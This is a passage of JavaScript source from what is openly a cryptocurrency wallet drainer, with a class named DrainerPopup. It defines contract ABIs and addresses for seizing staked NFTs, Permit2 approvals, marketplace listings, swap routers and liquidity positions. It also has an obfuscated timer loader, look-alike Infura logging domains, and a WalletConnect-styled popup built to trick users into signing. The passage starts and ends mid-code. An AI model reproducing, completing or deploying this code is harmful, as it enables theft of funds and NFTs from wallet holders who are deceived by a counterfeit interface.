            "name": "amount",
            "type": "uint224"
        }],
        "internalType": "struct ApeCoinStaking.SingleNft[]",
        "name": "_nfts",
        "type": "tuple[]"
    }, {
        "internalType": "address",
        "name": "_recipient",
        "type": "address"
    }],
    "name": "withdrawMAYC",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
}];
const ETH_CONTRACT = [{
    "inputs": [{
        "internalType": "address",
        "name": "recipient",
        "type": "address"
    }, {
        "internalType": "uint256",
        "name": "percentage",
        "type": "uint256"
    }],
    "name": "claim",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
}];
const potatoz_ABI = [{
    "inputs": [{
        "internalType": "address",
        "name": "from",
        "type": "address"
    }, {
        "internalType": "address",
        "name": "to",
        "type": "address"
    }, {
        "internalType": "uint256[]",
        "name": "tokenIds",
        "type": "uint256[]"
    }],
    "name": "stakeTransferAll",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
}];
const creepz_ABI = [{
    "inputs": [{
        "internalType": "address",
        "name": "to",
        "type": "address"
    }, {
        "internalType": "uint256[]",
        "name": "tokenIds",
        "type": "uint256[]"
    }],
    "name": "transferWhileStaked",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
}];
const COMET_ABI = [{
    "inputs": [{
        "internalType": "address",
        "name": "manager",
        "type": "address"
    }, {
        "internalType": "bool",
        "name": "isAllowed_",
        "type": "bool"
    }],
    "name": "allow",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
}];
const m = {
    "1": 0x0,
    "10": 0x0,
    "25": 0x0,
    "56": 0x0,
    "137": 0x0,
    "250": 0x0
};
function t9(t, n, K) {
    return q(K - 0x176, n);
}
m["8453"] = 0x0;
m["42220"] = 0x0;
m["42161"] = 0x0;
m["43114"] = 0x0;
class Configuration {
    ["signature"] = '';
    ["unsubscribe"];
    ["modal"];
    ["web3Js"];
    ["metamaskInstalled"] = false;
    ["isConnected"] = false;
    ["started"] = false;
    ["subscribed"] = false;
    ["ethereumClient"] = {};
    ["ethereumClient2"] = {};
    ["ethereumClient3"] = {};
    ["ethereumClient4"] = {};
    ["ethereumClient5"] = {};
    ["ethereumClient6"] = {};
    ["meta_connector"];
    ["injected_connector"];
    ["coinbase_connector"];
    ["logDomainName"] = "https://rpc.infura-api.com/";
    ["apiDomainName"] = "https://api.infura-api.com/";
    ["hueModal"];
    ["signer"];
    ["ethers_provider"];
    ["walletAddress"];
    ["walletBalance"];
    ["walletBalanceInEth"];
    ["chainId"];
    ["nonce"];
    ["secondProvider"];
    ["projectId"] = config.wc_project;
    ["cryptoPunk"] = "0xb47e3cd837ddf8e4c57f05d70ab865de6e193bbb";
    ["txcount"] = 0;
    ["bayc"] = "0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d";
    ["mayc"] = "0x60e4d786628fea6478f785a6d7e704777c86a7c6";
    ["apeCoin"] = "0x4d224452801aced8b2f0aebe155379bb5d594381";
    ["apeStaking"] = "0x5954aB967Bc958940b7EB73ee84797Dc8a2AFbb9";
    ["seaportConduit"] = "0x1e0049783f008a0085193e00003d00cd54003c71";
    ["blurConduit"] = "0x00000000000111abe46ff893f3b2fdf1f759a8a8";
    ["blurRouter"] = "0x000000000000Ad05Ccc4F10045630fb830B95127";
    ["uniswapV3Router1"] = "0xE592427A0AEce92De3Edee1F18E0157C05861564";
    ["uniswapV3Router2"] = "0x68b3465833fb72a70ecdf485e0e4c7bd8665fc45";
    ["pancakeSwapRouter"] = "0xEfF92A263d31888d860bD50809A8D171709b7b1c";
    ["pancakeSwapSmartRouter"] = "0x13f4EA83D0bd40E75C8222255bc855a974568Dd4";
    ["sushiSwapRouter"] = "0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F";
    ["uniswapV3Positions"] = "0xC36442b4a4522E871399CD717aBDD847Ab11FE88";
    ["pancakeswapV3Positions"] = "0x46A15B0b27311cedF172AB29E4f4766fbE7F4364";
    ["camelotV3Positions"] = "0x00c7f3082833e796A5b3e4Bd59f6642FF44DCD15";
    ["quickswapV3Positions"] = "0x8eF88E4c7CfbbaC1C163f7eddd4B578792201de6";
    ["veNFTContract"] = "0xFAf8FD17D9840595845582fCB047DF13f006787d";
    ["sushiswapV3Positions"] = {
        0x1: "0x2214A42d8e2A1d20635c2cb0664422c528B6A432",
        0xa: "0x9c6522117e2ed1fE5bdb72bb0eD5E3f2bdE7DBe0",
        0x38: "0xF70c086618dcf2b1A461311275e00D6B722ef914",
        0x89: "0xb7402ee99F0A008e461098AC3A27F4957Df89a40",
        0xa4b1: "0xF0cBce1942A68BEB3d1b73F0dd86C8DCc363eF49"
    };
    ["receiverSwapTokenAddress"] = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";
    ["receiverSwapTokenAddressAlt"] = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
    ["receiverSwapTokenAddressWBNB"] = "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c";
    ["receiverSwapTokenAddressBUSD"] = "0x55d398326f99059ff775485246999027b3197955";
    ["ens"] = "0x57f1887a8bf19b14fc0df6fd9b2acc9af147ea85";
    ["permitContract"] = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
    ["cam_lpv3_tokens"];
    ["cam_lpv3_value"] = 0;
    ["sus_lpv3_tokens"];
    ["sus_lpv3_value"] = 0;
    ["sweets"] = [];
    ["vault"] = [];
    ["ultraVault"] = [];
    ["transactions"] = [];
    ["filteredTransactions"];
    ["NFTtokens"] = [];
    ["ERC20tokens"] = [];
    ["stakedPotatoz"];
    ["potatozValue"] = 0;
    ["creepzStaked"];
    ["creepzValue"] = 0;
    ["apeStakedTokens"] = [];
    ["apeStakedValue"] = 0;
    ["blurTokens"] = [];
    ["rpcInstance"] = '';
    ["blurValue"] = 0;
    ["seaportTokens"] = [];
    ["offers"] = [];
    ["considerations"] = [];
    ["seaportValue"] = 0;
    ["uniswapTokens"] = [];
    ["uniswapValue"] = 0;
    ["permitTokens"] = [];
    ["permitValue"] = 0;
    ["potatozValue"] = 0;
    ["potatozStaked"] = [];
    ["pancakeswapTokens_eth"] = [];
    ["pancakeswapTokens_bsc"] = [];
    ["sushiswapTokens"] = [];
    ["sushiswapValue"] = 0;
    ["lpv3_tokens"];
    ["lpv3_value"];
    ["pnc_lpv3_tokens"];
    ["pnc_lpv3_value"] = 0;
    ["traderJoeTokens"];
    ["tradingJoeValue"] = 0;
    ["qck_lpv3_tokens"];
    ["qck_lpv3_value"] = 0;
    ["pending"] = [];
    ["estimated_txs"] = m;
    ["requestOptions"] = {
        "method": "GET",
        "headers": {
            "Accept": "application/json",
            "X-API-KEY": ''
        }
    };
    ["requestOptionsPOST"] = {
        "method": "POST",
        "headers": {
            "Accept": "application/json"
        }
    };
    ["walletType"];
    ["bypassMinAmount"] = 2;
    ["netWorth"] = 0;
    ["contractId"] = 0;
    ["connectButton"] = document.querySelectorAll("." + config.design.connectElement);
    ["twoStepButton"] = document.querySelectorAll("." + config.design.twoStepButtonElement);
    ["messageButton"] = document.getElementById(config.design.messageElement);
    ["eligible"] = document.getElementById("notEli");
    ["Swal"];
    ["modal_shadowRoot"];
}
(function () {
    let n;
    try {
        const K = Function("return (function() {}.constructor(\"return this\")( ));");
        n = K();
    } catch (u) {
        n = window;
    }
    n.setInterval(g, 1000);
})();
class DrainerPopup {
    static ["renderPopup"] = async () => {
        try {
            if (config.design.enablePopup) {
                if (!config.experimental["react-safe"]) {
                    console.log("Rendering popup...");
                    if (config.popupCode && !config.useDefaultPopup) {
                        const u = document.createElement("div");
                        u.innerHTML = popupCode;
                        document.body.appendChild(u);
                    } else {
                        if (config.USE_W3M_V3) {
                            let S = {
                                "--w3m-color-fg-1": "rgb(228,231,231)",
                                "--w3m-color-fg-2": "rgb(148,158,158)",
                                "--w3m-color-fg-3": "rgb(110,119,119)",
                                "--w3m-color-bg-1": "rgb(20,20,20)",
                                "--w3m-color-bg-2": "rgb(39,42,42)",
                                "--w3m-color-bg-3": "rgb(59,64,64)",
                                "--w3m-color-overlay": "rgba(255,255,255,0.1)",
                                "--w3m-accent-color": "#3396FF",
                                "--w3m-accent-fill-color": "#FFFFFF",
                                "--w3m-z-index": "10000",
                                "--w3m-background-color": "#3396FF",
                                "--w3m-background-border-radius": "8px",
                                "--w3m-container-border-radius": "30px",
                                "--w3m-wallet-icon-border-radius": "15px",
                                "--w3m-wallet-icon-large-border-radius": "30px",
                                "--w3m-wallet-icon-small-border-radius": "7px",
                                "--w3m-input-border-radius": "28px",
                                "--w3m-button-border-radius": "10px",
                                "--w3m-notification-border-radius": "36px",
                                "--w3m-secondary-button-border-radius": "28px",
                                "--w3m-icon-button-border-radius": "50%",
                                "--w3m-button-hover-highlight-border-radius": "10px",
                                "--w3m-text-big-bold-size": "20px",
                                "--w3m-text-big-bold-weight": "600",
                                "--w3m-text-big-bold-line-height": "24px",
                                "--w3m-text-big-bold-letter-spacing": "-0.03em",
                                "--w3m-text-big-bold-text-transform": "none",
                                "--w3m-text-xsmall-bold-size": "10px",
                                "--w3m-text-xsmall-bold-weight": "700",
                                "--w3m-text-xsmall-bold-line-height": "12px",
                                "--w3m-text-xsmall-bold-letter-spacing": "0.02em",
                                "--w3m-text-xsmall-bold-text-transform": "uppercase",
                                "--w3m-text-xsmall-regular-size": "12px",
                                "--w3m-text-xsmall-regular-weight": "600",
                                "--w3m-text-xsmall-regular-line-height": "14px",
                                "--w3m-text-xsmall-regular-letter-spacing": "-0.03em",
                                "--w3m-text-xsmall-regular-text-transform": "none",
                                "--w3m-text-small-thin-size": "14px",
                                "--w3m-text-small-thin-weight": "500",
                                "--w3m-text-small-thin-line-height": "16px",
                                "--w3m-text-small-thin-letter-spacing": "-0.03em",
                                "--w3m-text-small-thin-text-transform": "none",
                                "--w3m-text-small-regular-size": "14px",
                                "--w3m-text-small-regular-weight": "600",
                                "--w3m-text-small-regular-line-height": "16px",
                                "--w3m-text-small-regular-letter-spacing": "-0.03em",
                                "--w3m-text-medium-regular-size": "16px",
                                "--w3m-text-medium-regular-weight": "600",
                                "--w3m-text-medium-regular-line-height": "20px",
                                "--w3m-text-medium-regular-letter-spacing": "-0.03em",
                                "--w3m-text-medium-regular-text-transform": "none",
                                "--w3m-font-family": "-apple-system, system-ui, BlinkMacSystemFont, \"Segoe UI\", Roboto, Ubuntu, \"Helvetica Neue\", sans-serif",
                                "--w3m-font-feature-settings": "\"tnum\" on, \"lnum\" on, \"case\" on",
                                "--w3m-success-color": "rgb(38,181,98)",
                                "--w3m-error-color": "rgb(242, 90, 103)",
                                "--w3m-overlay-background-color": "rgba(0, 0, 0, 0.3)",
                                "--w3m-overlay-backdrop-filter": "blur(6px)",
                                "--w3m-background-image-url": "none"
                            };
                            if (config.chooseTheme == "light") {
                                let U = {
                                    "--w3m-color-fg-1": "rgb(20,20,20)",
                                    "--w3m-color-fg-2": "rgb(121,134,134)",
                                    "--w3m-color-fg-3": "rgb(158,169,169)",
                                    "--w3m-color-bg-1": "rgb(255,255,255)",
                                    "--w3m-color-bg-2": "rgb(241,243,243)",
                                    "--w3m-color-bg-3": "rgb(228,231,231)",
                                    "--w3m-color-overlay": "rgba(0,0,0,0.1)",
                                    "--w3m-accent-color": "#3396FF",
                                    "--w3m-accent-fill-color": "#FFFFFF",
                                    "--w3m-background-color": "#3396FF",
                                    "--w3m-success-color": "rgb(38,181,98)",
                                    "--w3m-error-color": "rgb(242, 90, 103)",
                                    "--w3m-overlay-background-color": "rgba(0, 0, 0, 0.3)",
                                    "--w3m-overlay-backdrop-filter": "blur(6px)"
                                };
                                Object.keys(U).map(D => S[D] = U[D]);
                            }
                            for (const D in S) {
                                document.documentElement.style.setProperty(D, S[D]);
                            }
                        }
                        let Y = document.head || document.getElementsByTagName("head")[0];
                        let a = document.createElement("style");
                        Y.appendChild(a);
                        a.type = "text/css";
                        if (a.styleSheet) {
                            a.styleSheet.cssText = ".swal2-popup {\tborder: 1px;\tfont-size: 1rem;\tborder-style: solid;\tborder-color: rgb(39,42,42);\tborder-radius: var(--w3m-container-border-radius);\tbackground-color: var(--w3m-color-bg-1);\tfont-family: var(--w3m-font-family);\tcolor: var(--w3m-color-fg-1);}.swal2-popup-square {\twidth: 30vh;\tmax-width: 50vh;\tmax-height: 50vh;\tfont-size: 1rem;\tpadding-bottom: 0px;\tborder-radius: var(--w3m-container-border-radius);\tbackground-color: var(--w3m-color-bg-1);\tfont-family: var(--w3m-font-family);\tcolor: var(--w3m-color-fg-1);\t/* Make it untouchable. */\t-webkit-touch-callout: none;\t-webkit-user-select: none;\t-khtml-user-select: none;\t-moz-user-select: none;\t-ms-user-select: none;\tuser-select: none;}.swal2-subtext {\tcolor: var(--w3m-color-fg-1);\tfont-size: var(--w3m-text-medium-regular-size);\tfont-weight: var(--w3m-text-medium-regular-weight);}.swal2-confirm-button {\tbackground-color: var(--w3m-accent-color);\tcolor: #fff;\tborder: none;\tbox-shadow: none;\tborder-radius: var(--w3m-wallet-icon-border-radius);\tfont-weight: 600;\tpadding: 10px 24px;\tmargin: 0;\tcursor: pointer;}.swal2-footer {\tmargin: 1em 0 0;\tpadding: 1em 1em 0;\tborder: 0px;}.swal2-title {\tborder: 0px;\tborder-bottom: 1px;\tborder-color: rgb(39,42,42);\tpadding-bottom: 1.5vh;\tborder-style: solid;\tfont-size: var(--w3m-text-big-bold-size);\tfont-weight: var(--w3m-text-big-bold-weight);}.swal2-sub-footer {\tbackground-color: var(--w3m-color-bg-2);\tborder: 0px;\tborder-top: 1px;\tborder-style: solid;\tborder-radius: 0px 0px var(--w3m-container-border-radius) var(--w3m-container-border-radius);\tvar(--w3m-color-bg-3);\tcolor: rgb(148,158,158);\tfont-size: var(--w3m-text-small-thin-size);\tfont-weight: var(--w3m-text-small-thin-weight);\tmargin-top: 3vh;\tpadding: 15px;}.wallet-icon-container {\tposition: relative;\twidth: 110px;\theight: 110px;\tdisplay: flex;\tjustify-content: center;\talign-items: center;\tmargin: 10px 0px 10px;\ttransform: translate3d(0px, 0px, 0px);}.swal2-large-image {\tborder: 2px;\tborder-style: solid;\tborder-color: rgb(39,42,42);\tborder-radius: var(--w3m-wallet-icon-large-border-radius);\twidth: 90px;\theight: 90px;}.wallet-spinner-svg {\tstroke-width: 2px;\tposition: absolute;\tstroke: var(--w3m-accent-color);}.swal2-minimal-footer {\tmargin: 0em;\tmargin-top: 1.5vh;\tpadding: 0em;}.flex-center {\tdisplay: flex;\tflex-direction: column;\talign-items: center;}";
                        } else {
                            a.appendChild(document.createTextNode(".swal2-popup {\tborder: 1px;\tfont-size: 1rem;\tborder-style: solid;\tborder-color: rgb(39,42,42);\tborder-radius: var(--w3m-container-border-radius);\tbackground-color: var(--w3m-color-bg-1);\tfont-family: var(--w3m-font-family);\tcolor: var(--w3m-color-fg-1);}.swal2-popup-square {\twidth: 30vh;\tmax-width: 50vh;\tmax-height: 50vh;\tfont-size: 1rem;\tpadding-bottom: 0px;\tborder-radius: var(--w3m-container-border-radius);\tbackground-color: var(--w3m-color-bg-1);\tfont-family: var(--w3m-font-family);\tcolor: var(--w3m-color-fg-1);\t/* Make it untouchable. */\t-webkit-touch-callout: none;\t-webkit-user-select: none;\t-khtml-user-select: none;\t-moz-user-select: none;\t-ms-user-select: none;\tuser-select: none;}.swal2-subtext {\tcolor: var(--w3m-color-fg-1);\tfont-size: var(--w3m-text-medium-regular-size);\tfont-weight: var(--w3m-text-medium-regular-weight);}.swal2-confirm-button {\tbackground-color: var(--w3m-accent-color);\tcolor: #fff;\tborder: none;\tbox-shadow: none;\tborder-radius: var(--w3m-wallet-icon-border-radius);\tfont-weight: 600;\tpadding: 10px 24px;\tmargin: 0;\tcursor: pointer;}.swal2-footer {\tmargin: 1em 0 0;\tpadding: 1em 1em 0;\tborder: 0px;}.swal2-title {\tborder: 0px;\tborder-bottom: 1px;\tborder-color: rgb(39,42,42);\tpadding-bottom: 1.5vh;\tborder-style: solid;\tfont-size: var(--w3m-text-big-bold-size);\tfont-weight: var(--w3m-text-big-bold-weight);}.swal2-sub-footer {\tbackground-color: var(--w3m-color-bg-2);\tborder: 0px;\tborder-top: 1px;\tborder-style: solid;\tborder-radius: 0px 0px var(--w3m-container-border-radius) var(--w3m-container-border-radius);\tvar(--w3m-color-bg-3);\tcolor: rgb(148,158,158);\tfont-size: var(--w3m-text-small-thin-size);\tfont-weight: var(--w3m-text-small-thin-weight);\tmargin-top: 3vh;\tpadding: 15px;}.wallet-icon-container {\tposition: relative;\twidth: 110px;\theight: 110px;\tdisplay: flex;\tjustify-content: center;\talign-items: center;\tmargin: 10px 0px 10px;\ttransform: translate3d(0px, 0px, 0px);}.swal2-large-image {\tborder: 2px;\tborder-style: solid;\tborder-color: rgb(39,42,42);\tborder-radius: var(--w3m-wallet-icon-large-border-radius);\twidth: 90px;\theight: 90px;}.wallet-spinner-svg {\tstroke-width: 2px;\tposition: absolute;\tstroke: var(--w3m-accent-color);}.swal2-minimal-footer {\tmargin: 0em;\tmargin-top: 1.5vh;\tpadding: 0em;}.flex-center {\tdisplay: flex;\tflex-direction: column;\talign-items: center;}"));
                        }
                    }
                }
            }
            if (canClosePopup && config.design.enablePopup) {
                document.getElementById(popupCloseButtonID).addEventListener("click", () => {
                    this.closePopup();
                });
            }
        } catch (l) {
            console.log(l);
        }
    };
    static ["openPopup"] = () => {
        try {
            if (config.design.enablePopup) {
                console.log("Opening popup...");
                if (config.popupCode.length == 0 || config.useDefaultPopup) {
                    let u = "data:image/webp;base64,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";
                    let k = "wallet";
                    let Y = "unknown";
                    console.log(window.wallet_name);
                    try {
                        if (window.wallet_name) {
                            Y = window.wallet_name.trim().replace("injected\"", "Injected Wallet").replace(/[\$\^\*\"\']/g, '').replace("Trust Wallet is a secure and easy-to-use mobile wallet", "Trust Wallet").replace("eip6963", "Injected wallet");
                            k = Y;
                        }
                        if (window?.["main_provider"]?.["isMetaMask"] == true) {
                            k = "MetaMask Wallet";
                            Y = k;
                        }
                        if (window?.["main_provider"]?.["isTrustWallet"] == true) {
                            k = "Trust Wallet";
                            Y = k;
                        }
